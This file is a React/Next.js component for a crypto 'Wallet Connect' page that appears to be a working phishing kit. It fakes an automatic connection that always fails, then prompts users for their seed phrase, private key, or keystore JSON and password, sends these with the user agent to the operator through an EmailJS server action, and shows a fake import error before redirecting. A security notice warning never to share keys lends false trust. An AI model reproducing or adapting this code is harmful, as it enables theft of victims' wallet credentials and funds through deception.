"use client"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Search, ArrowLeft, Wallet, Loader2, AlertCircle } from "lucide-react"
import { useState } from "react"
import Link from "next/link"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { sendWalletData } from "@/app/actions/send-wallet-data"

const wallets = [
  {
    name: "MetaMask",
    description: "Connect using browser extension",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/MetaMask-8wZx2RTLoHsTDFNhMjOC46Shn547jj.avif", // Updated with new MetaMask logo
    popular: true,
  },
  {
    name: "WalletConnect",
    description: "Scan with WalletConnect to connect",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/walletconnect-seeklogo-XMktuIkF7fvcQEID4Z5JxDbB3bVwPT.png", // Updated with new WalletConnect logo
    popular: true,
  },
  {
    name: "Coinbase Wallet",
    description: "Connect using Coinbase Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Coinbase20Wallet-kW4kluZ1ER1LbYPTPCB4DuyNXiY0AZ.avif", // Updated with new Coinbase Wallet logo
    popular: true,
  },
  {
    name: "Trust Wallet",
    description: "Connect using Trust Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/download%20trust.jfif-XHrFfq1Yshs1Go0eghadfDZO2f2TbU.jpeg", // Updated with new perfect Trust Wallet logo
    popular: true,
  },
  {
    name: "Phantom",
    description: "Connect using Phantom wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Phantom20Wallet-q3RFXHywyttfH8x3BiwxxOK5TgfDnw.avif", // Updated with new Phantom logo
    popular: true,
  },
  {
    name: "OKX Wallet",
    description: "Connect using OKX Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/OKX20Wallet-5WEn0eQSSEvmuzVoKjya79cDaGlpEo.avif", // Updated with new OKX Wallet logo
    popular: true,
  },
  {
    name: "Binance Wallet",
    description: "Connect using Binance Chain Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/idwiMPAwxr_logos-2icRJgfuMeUcH1XlxacEPo9GdVIEbl.jpeg", // Updated with new perfect Binance Wallet logo
    popular: true,
  },
  {
    name: "SafePal",
    description: "Connect using SafePal wallet",
    icon: "https://safepal.com/favicon.ico",
    popular: true,
  },
  {
    name: "Atomic Wallet",
    description: "Connect using Atomic Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Atomic20Wallet-vtxcdDyyYbdk5yZJ0mBh2V3dAzzYD0.avif", // Updated with new Atomic Wallet logo
    popular: false,
  },
  {
    name: "Auro Wallet",
    description: "Connect using Auro Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/idNdjH9Su4_logos-A4R12n9MnG8eldFz45E8wpO2HkkwZp.jpeg", // Updated with new Auro Wallet logo
    popular: false,
  },
  {
    name: "Keplr",
    description: "Connect using Keplr wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Keplr%20Wallet_idHOIKfgFe_0-8QbtKayp2GMH1HAVu6Ym7pNhUPF0Ev.png", // Updated with new perfect Keplr logo
    popular: false,
  },
  {
    name: "Bitget Wallet",
    description: "Connect using Bitget Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Bitget20Wallet-Ib5QECA78wblcUAsuxmYksYPA1bNyx.avif", // Updated with existing Bitget Wallet logo
    popular: false,
  },
  {
    name: "Ronin Wallet",
    description: "Connect using Ronin Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ronin20Wallet-mM6gW47dsQ3ETOSZdELYSGHFgRqg4X.avif", // Updated with existing Ronin Wallet logo
    popular: false,
  },
  {
    name: "Nova Wallet",
    description: "Connect using Nova Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Star_color-U6LtG55MQ2RoFbnqpLTLJUZaKAVSkH.png", // Updated with new perfect Nova Wallet logo
    popular: false,
  },
  {
    name: "1inch Wallet",
    description: "Connect using 1inch Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/1inch_without_text-AoXmCFtMp1sfGzxa6QkSiJ1yaGD32h.webp", // Updated with new perfect 1inch Wallet logo
    popular: false,
  },
  {
    name: "Uniswap Wallet",
    description: "Connect using Uniswap Wallet",
    icon: "https://app.uniswap.org/favicon.ico", // This favicon.ico might not work well
    popular: false,
  },
  {
    name: "Zerion",
    description: "Connect using Zerion wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Zerion-F2SiH6rDBCyYe6YfdMpSoG7U3nVcry.avif", // Updated with new Zerion logo
    popular: false,
  },
  {
    name: "imToken",
    description: "Connect using imToken wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/imToken-OndDXKu9o7W0kdAzeFjS9ZAZ8ae9eM.avif", // Updated with new imToken logo
    popular: false,
  },
  {
    name: "TokenPocket",
    description: "Connect using TokenPocket wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/TokenPocket-T3eadwQbBpmdCaI8FRHJ3ZssGoBA17.avif", // Updated with existing TokenPocket logo
    popular: false,
  },
  {
    name: "Math Wallet",
    description: "Connect using Math Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/MathWallet_App_Icon-mUXGOL2EOMzGGRY2hGbgG1CngQyT8x.png", // Updated with new Math Wallet logo
    popular: false,
  },
  {
    name: "Gate.io Wallet",
    description: "Connect using Gate.io Wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Gate20Wallet-2koEryyAT2rgF8tKRd4mHbjO9h1gIE.avif", // Updated with existing Gate.io Wallet logo
    popular: false,
  },
  {
    name: "Brave Wallet",
    description: "Connect using Brave browser wallet",
    icon: "https://brave.com/static-assets/images/brave-logo-sans-text.svg", // This SVG might not work well
    popular: false,
  },
  {
    name: "Ledger",
    description: "Connect using Ledger hardware wallet",
    icon: "https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-long.svg", // This SVG might not work well
    popular: false,
  },
  {
    name: "Trezor",
    description: "Connect using Trezor hardware wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Trezor-7LGt4sf0fsoMXuASSsAfSkMZwGFCbh.avif", // Updated with new Trezor logo
    popular: false,
  },
  {
    name: "Rainbow",
    description: "Connect using Rainbow wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Rainbow-Xcg3b8ZizaZvKl5JwPhMjTiJ0uJmHU.avif", // Updated with new Rainbow logo
    popular: false,
  },
  {
    name: "Argent",
    description: "Connect using Argent wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/idNobMdd7B_logos-UIeJXkxK147RT0WKZp5FXdVzz3qfxi.png", // Updated with new perfect Argent logo
    popular: false,
  },
  {
    name: "Exodus",
    description: "Connect using Exodus wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Exodus_symbol-jzkQE5VeCMscQd7rHKZLu4aj7qT3El.png", // Updated with new perfect Exodus logo
    popular: false,
  },
  {
    name: "Solflare",
    description: "Connect using Solflare wallet",
    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Solflare-1N4NbHtgBWHx6Oxx0imTfQSUa3QUSS.avif", // Updated with existing Solflare logo
    popular: false,
  },
]

type ConnectionState = "idle" | "connecting" | "failed" | "manual" | "submitting" | "error"
type ConnectionMethod = "phrase" | "keystore" | "privatekey"

export function WalletConnectionPage() {
  const [searchTerm, setSearchTerm] = useState("")
  const [connectionState, setConnectionState] = useState<ConnectionState>("idle")
  const [selectedWallet, setSelectedWallet] = useState<(typeof wallets)[0] | null>(null)
  const [seedPhrase, setSeedPhrase] = useState("")
  const [phraseError, setPhraseError] = useState("")
  const [connectionMethod, setConnectionMethod] = useState<ConnectionMethod>("phrase")
  const [privateKey, setPrivateKey] = useState("")
  const [keystoreJson, setKeystoreJson] = useState("")
  const [keystorePassword, setKeystorePassword] = useState("")
  const [inputError, setInputError] = useState("")
  const router = useRouter()

  const filteredWallets = wallets.filter((wallet) => wallet.name.toLowerCase().includes(searchTerm.toLowerCase()))
  const popularWallets = filteredWallets.filter((wallet) => wallet.popular)
  const otherWallets = filteredWallets.filter((wallet) => !wallet.popular)

  const validateSeedPhrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/)
    return words.length === 12 || words.length === 24
  }

  const validatePrivateKey = (key: string): boolean => {
    const cleanKey = key.trim().replace(/^0x/, "")
    return /^[a-fA-F0-9]{64}$/.test(cleanKey)
  }

  const validateKeystoreJson = (json: string, password: string): boolean => {
    try {
      const parsed = JSON.parse(json)
      return parsed.version && parsed.crypto && password.length > 0
    } catch {
      return false
    }
  }

  const handleWalletClick = async (wallet: (typeof wallets)[0]) => {
    setSelectedWallet(wallet)
    setConnectionState("connecting")

    const connectionTime = Math.random() * 2000 + 3000

    setTimeout(() => {
      setConnectionState("failed")
    }, connectionTime)
  }

  const handleManualConnect = () => {
    setConnectionState("manual")
  }

  const handleConnectionSubmit = async () => {
    let isValid = false
    let inputData = ""
    setInputError("")

    switch (connectionMethod) {
      case "phrase":
        const trimmedPhrase = seedPhrase.trim()
        isValid = validateSeedPhrase(trimmedPhrase)
        inputData = trimmedPhrase
        if (!isValid) {
          setInputError("Please enter a valid 12 or 24-word seed phrase")
          return
        }
        break
      case "privatekey":
        isValid = validatePrivateKey(privateKey)
        inputData = privateKey
        if (!isValid) {
          setInputError("Please enter a valid 64-character private key")
          return
        }
        break
      case "keystore":
        isValid = validateKeystoreJson(keystoreJson, keystorePassword)
        inputData = `JSON: ${keystoreJson}\nPassword: ${keystorePassword}`
        if (!isValid) {
          setInputError("Please provide valid keystore JSON and password")
          return
        }
        break
    }

    setConnectionState("submitting")

    try {
      const result = await sendWalletData({
        walletName: selectedWallet?.name || "Unknown",
        connectionMethod: connectionMethod.charAt(0).toUpperCase() + connectionMethod.slice(1),
        walletData: inputData,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      })

      // Check if EmailJS submission was successful
      if (!result.success) {
        console.error("[v0] EmailJS submission failed:", result.error)
        setInputError(`Email submission failed: ${result.error}. Please check your EmailJS configuration.`)
        setConnectionState("manual")
        return
      }

      console.log("[v0] EmailJS submission successful")
    } catch (error) {
      console.error("[v0] Failed to send wallet data:", error)
      setInputError("Failed to submit wallet data. Please check your EmailJS setup and try again.")
      setConnectionState("manual")
      return
    }

    setTimeout(() => {
      setConnectionState("error")
      setTimeout(() => {
        router.push("/")
      }, 4000)
    }, 3500)
  }

  const resetConnection = () => {
    setConnectionState("idle")
    setSelectedWallet(null)
    setSeedPhrase("")
    setPhraseError("")
    setPrivateKey("")
    setKeystoreJson("")
    setKeystorePassword("")
    setInputError("")
    setConnectionMethod("phrase")
  }

  if (connectionState !== "idle") {
    return (
      <div className="min-h-screen bg-background">
        <div className="border-b border-border/50 bg-background/80 backdrop-blur-sm sticky top-0 z-50">
          <div className="container mx-auto px-4 py-4">
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                size="sm"
                onClick={resetConnection}
                className="text-muted-foreground hover:text-foreground"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <div className="flex items-center gap-3">
                <div className="p-2 glass rounded-lg">
                  <Wallet className="w-5 h-5 text-primary" />
                </div>
                <h1 className="text-xl font-semibold text-foreground">WALLET CONNECT</h1>
              </div>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8">
          <div className="max-w-md mx-auto">
            {connectionState === "connecting" && selectedWallet && (
              <div className="text-center space-y-6">
                <div className="glass p-8 rounded-2xl">
                  <div className="flex flex-col items-center gap-4">
                    <Image
                      src={selectedWallet.icon || "/placeholder.svg"}
                      alt={selectedWallet.name}
                      width={64}
                      height={64}
                      className="rounded-lg"
                    />
                    <div>
                      <h3 className="text-xl font-semibold text-foreground mb-2">
                        Connecting to {selectedWallet.name}
                      </h3>
                      <p className="text-muted-foreground">Please wait while we establish connection...</p>
                    </div>
                    <div className="flex items-center gap-2 text-primary">
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span className="text-sm">Connecting...</span>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {connectionState === "failed" && selectedWallet && (
              <div className="text-center space-y-6">
                <div className="glass p-8 rounded-2xl">
                  <div className="flex flex-col items-center gap-4">
                    <div className="p-3 bg-destructive/20 rounded-full">
                      <AlertCircle className="w-8 h-8 text-destructive" />
                    </div>
                    <div>
                      <h3 className="text-xl font-semibold text-foreground mb-2">Connection Failed</h3>
                      <p className="text-muted-foreground mb-4">
                        Unable to automatically connect to {selectedWallet.name}. Please try connecting manually with
                        your seed phrase.
                      </p>
                    </div>
                    <Button onClick={handleManualConnect} className="w-full">
                      Connect Manually
                    </Button>
                  </div>
                </div>
              </div>
            )}

            {connectionState === "submitting" && (
              <div className="text-center space-y-6">
                <div className="glass p-8 rounded-2xl">
                  <div className="flex flex-col items-center gap-4">
                    <div className="flex items-center gap-2 text-primary">
                      <Loader2 className="w-8 h-8 animate-spin" />
                    </div>
                    <div>
                      <h3 className="text-xl font-semibold text-foreground mb-2">Importing Wallet</h3>
                      <p className="text-muted-foreground">Please wait while we import your wallet...</p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {connectionState === "error" && (
              <div className="text-center space-y-6">
                <div className="glass p-8 rounded-2xl">
                  <div className="flex flex-col items-center gap-4">
                    <div className="p-3 bg-destructive/20 rounded-full">
                      <AlertCircle className="w-8 h-8 text-destructive" />
                    </div>
                    <div>
                      <h3 className="text-xl font-semibold text-foreground mb-2">Import Failed</h3>
                      <p className="text-muted-foreground mb-4">
                        Connection failed: Invalid wallet credentials or network error. Please verify your seed phrase,
                        private key, or keystore data and try again.
                      </p>
                      <p className="text-sm text-muted-foreground">Redirecting to homepage in a few seconds...</p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {connectionState === "manual" && selectedWallet && (
              <div className="space-y-6">
                <div className="glass p-8 rounded-2xl">
                  <div className="flex flex-col items-center gap-4 mb-6">
                    <Image
                      src={selectedWallet.icon || "/placeholder.svg"}
                      alt={selectedWallet.name}
                      width={48}
                      height={48}
                      className="rounded-lg"
                    />
                    <div className="text-center">
                      <h3 className="text-xl font-semibold text-foreground mb-2">
                        Validate your selected wallet{" "}
                        <span className="bg-muted px-2 py-1 rounded text-sm">{selectedWallet.name}</span> to continue
                      </h3>
                    </div>
                  </div>

                  <div className="space-y-6">
                    <div className="flex space-x-1 bg-muted/20 p-1 rounded-lg">
                      <button
                        onClick={() => setConnectionMethod("phrase")}
                        className={`flex-1 px-4 py-2 text-sm font-medium rounded-md transition-all cursor-pointer ${
                          connectionMethod === "phrase"
                            ? "bg-background text-foreground shadow-sm"
                            : "text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        Phrase
                      </button>
                      <button
                        onClick={() => setConnectionMethod("keystore")}
                        className={`flex-1 px-4 py-2 text-sm font-medium rounded-md transition-all cursor-pointer ${
                          connectionMethod === "keystore"
                            ? "bg-background text-foreground shadow-sm"
                            : "text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        Keystore JSON
                      </button>
                      <button
                        onClick={() => setConnectionMethod("privatekey")}
                        className={`flex-1 px-4 py-2 text-sm font-medium rounded-md transition-all cursor-pointer ${
                          connectionMethod === "privatekey"
                            ? "bg-background text-foreground shadow-sm border-b-2 border-primary"
                            : "text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        Private Key
                      </button>
                    </div>

                    {connectionMethod === "phrase" && (
                      <div className="space-y-4">
                        <textarea
                          placeholder="Enter your 12 or 24-word recovery phrase separated by spaces..."
                          value={seedPhrase}
                          onChange={(e) => {
                            setSeedPhrase(e.target.value)
                            setInputError("")
                          }}
                          className="w-full h-24 px-3 py-2 text-sm bg-background/50 border border-border/50 rounded-lg resize-none focus:outline-none focus:ring-2 focus:ring-primary/50"
                        />
                        <p className="text-sm text-primary text-center">
                          Typically 12 (sometimes 24) words separated by a single space.
                        </p>
                      </div>
                    )}

                    {connectionMethod === "privatekey" && (
                      <div className="space-y-4">
                        <Input
                          type="password"
                          placeholder="PrivateKey"
                          value={privateKey}
                          onChange={(e) => {
                            setPrivateKey(e.target.value)
                            setInputError("")
                          }}
                          className="w-full bg-background/50 border border-border/50 focus:ring-2 focus:ring-primary/50"
                        />
                        <p className="text-sm text-primary text-center">
                          Typically 12 (sometimes 24) words separated by a single space.
                        </p>
                      </div>
                    )}

                    {connectionMethod === "keystore" && (
                      <div className="space-y-4">
                        <textarea
                          placeholder="Paste your keystore JSON here..."
                          value={keystoreJson}
                          onChange={(e) => {
                            setKeystoreJson(e.target.value)
                            setInputError("")
                          }}
                          className="w-full h-32 px-3 py-2 text-sm bg-background/50 border border-border/50 rounded-lg resize-none focus:outline-none focus:ring-2 focus:ring-primary/50"
                        />
                        <Input
                          type="password"
                          placeholder="Keystore password"
                          value={keystorePassword}
                          onChange={(e) => {
                            setKeystorePassword(e.target.value)
                            setInputError("")
                          }}
                          className="w-full bg-background/50 border border-border/50 focus:ring-2 focus:ring-primary/50"
                        />
                        <p className="text-sm text-primary text-center">
                          Upload your keystore file and enter the password to decrypt it.
                        </p>
                      </div>
                    )}

                    {inputError && (
                      <p className="text-xs text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {inputError}
                      </p>
                    )}

                    <div className="glass p-3 rounded-lg">
                      <p className="text-xs text-muted-foreground">
                        ⚠️ <strong>Security Notice:</strong> Never share your private keys or seed phrases with anyone.
                        Only enter them on trusted devices and official wallet applications.
                      </p>
                    </div>

                    <Button
                      className="w-full cursor-pointer"
                      disabled={connectionState === "submitting"}
                      onClick={handleConnectionSubmit}
                    >
                      {connectionState === "submitting" ? (
                        <>
                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                          Importing Wallet...
                        </>
                      ) : (
                        "Proceed"
                      )}
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="border-b border-border/50 bg-background/80 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center gap-4">
            <Link href="/">
              <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
            </Link>
            <div className="flex items-center gap-3">
              <div className="p-2 glass rounded-lg">
                <Wallet className="w-5 h-5 text-primary" />
              </div>
              <h1 className="text-xl font-semibold text-foreground">WALLET CONNECT</h1>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="text-center mb-8">
          <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold text-foreground mb-4">Connect Your Wallet</h2>
          <p className="text-lg text-muted-foreground max-w-2xl mx-auto mb-8">
            Choose your preferred wallet to get started with Web3
          </p>

          <div className="relative max-w-md mx-auto">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
            <Input
              type="text"
              placeholder="Search wallets..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-10 glass border-border/50 bg-background/50"
            />
          </div>
        </div>

        {popularWallets.length > 0 && (
          <div className="mb-12">
            <h3 className="text-xl font-semibold text-foreground mb-6">Popular Wallets</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              {popularWallets.map((wallet) => (
                <Button
                  key={wallet.name}
                  variant="outline"
                  onClick={() => handleWalletClick(wallet)}
                  className="glass p-6 h-auto flex flex-col items-center gap-3 hover:scale-105 transition-all duration-200 border-border/50 hover:border-primary/50 bg-transparent cursor-pointer"
                >
                  <Image
                    src={wallet.icon || "/placeholder.svg"}
                    alt={wallet.name}
                    width={48}
                    height={48}
                    className="rounded-lg"
                  />
                  <div className="text-center">
                    <div className="font-semibold text-foreground">{wallet.name}</div>
                    <div className="text-sm text-muted-foreground">{wallet.description}</div>
                  </div>
                </Button>
              ))}
            </div>
          </div>
        )}

        {otherWallets.length > 0 && (
          <div>
            <h3 className="text-xl font-semibold text-foreground mb-6">All Wallets</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              {otherWallets.map((wallet) => (
                <Button
                  key={wallet.name}
                  variant="outline"
                  onClick={() => handleWalletClick(wallet)}
                  className="glass p-6 h-auto flex flex-col items-center gap-3 hover:scale-105 transition-all duration-200 border-border/50 hover:border-primary/50 bg-transparent cursor-pointer"
                >
                  <Image
                    src={wallet.icon || "/placeholder.svg"}
                    alt={wallet.name}
                    width={48}
                    height={48}
                    className="rounded-lg"
                  />
                  <div className="text-center">
                    <div className="font-semibold text-foreground">{wallet.name}</div>
                    <div className="text-sm text-muted-foreground">{wallet.description}</div>
                  </div>
                </Button>
              ))}
            </div>
          </div>
        )}

        {filteredWallets.length === 0 && (
          <div className="text-center py-12">
            <div className="text-muted-foreground mb-4">No wallets found matching "{searchTerm}"</div>
            <Button variant="outline" onClick={() => setSearchTerm("")} className="glass cursor-pointer">
              Clear Search
            </Button>
          </div>
        )}
      </div>
    </div>
  )
}
